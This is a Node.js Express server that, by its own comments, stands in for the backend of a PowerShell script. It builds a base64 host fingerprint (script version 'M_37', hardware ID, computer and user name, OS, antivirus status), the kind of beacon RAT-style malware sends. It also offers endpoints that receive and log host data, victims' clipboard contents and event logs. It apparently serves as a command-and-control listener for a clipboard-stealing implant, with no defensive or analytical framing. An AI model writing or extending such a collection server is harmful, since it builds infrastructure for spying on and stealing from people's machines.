const express = require('express');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Mimic the PowerShell script's functionality in NodeJS
const getUserAgent = () => {
    const scriptVersion = "M_37";
    const hwid = crypto.randomBytes(16).toString('hex');
    const computerName = process.env.COMPUTERNAME || 'Unknown';
    const userName = process.env.USERNAME || 'Unknown';
    const osCaption = require('os').type();
    const addressWidth = process.arch === 'x64' ? '64' : '32';
    const avStatus = 'Unknown'; // Simplified, as actual AV status would require native modules or external calls
    const userAgent = `${scriptVersion}_${hwid}\\${computerName}\\${userName}\\${osCaption} [${addressWidth}]\\${avStatus}\\`;
    return Buffer.from(userAgent).toString('base64');
};

// Endpoint to receive data from the PowerShell script
app.post('/connect', (req, res) => {
    const data = req.body;
    const userAgent = getUserAgent();
    console.log(`Received data: ${JSON.stringify(data)}`);
    console.log(`User Agent: ${userAgent}`);
    // Process the data as needed
    // This could involve logging, storing to a database, or triggering other processes
    res.status(200).send('Data received');
});

// Endpoint to handle clipboard data change notifications
app.post('/clipboard-change', (req, res) => {
    const { clipboardData } = req.body;
    console.log(`Clipboard data changed: ${clipboardData}`);
    // Process the clipboard data as needed
    res.status(200).send('Clipboard data processed');
});

// Endpoint to handle log events
app.post('/log-event', (req, res) => {
    const { logMessage } = req.body;
    console.log(`Log event: ${logMessage}`);
    // Process the log event as needed
    res.status(200).send('Log event processed');
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});

